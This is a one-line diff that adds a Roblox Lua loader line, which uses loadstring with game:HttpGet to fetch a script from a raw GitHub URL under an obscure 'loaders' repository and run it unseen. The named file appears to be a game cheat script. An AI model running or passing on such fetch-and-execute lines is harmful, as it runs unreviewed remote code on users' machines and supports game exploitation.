@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BaseLizardFascinate/loaders/main/loaders/max-aura-phonk-edit-tower-spam3-lyhukxjpmcbesh.lua"))()
